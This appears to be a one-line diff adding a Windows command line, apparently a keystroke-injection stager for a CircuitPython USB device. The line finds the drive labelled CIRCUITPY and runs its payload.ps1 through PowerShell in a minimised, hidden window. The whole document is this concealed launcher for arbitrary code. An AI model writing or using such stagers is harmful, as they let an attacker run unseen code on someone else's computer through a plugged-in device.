@@ -1,0 +1,1 @@
+cmd /c start /min cmd /c "for /f %d in ('wmic volume get driveletter^, label ^| findstr "CIRCUITPY"') do cmd /c start /min powershell -W hidden iex %d\payload.ps1"
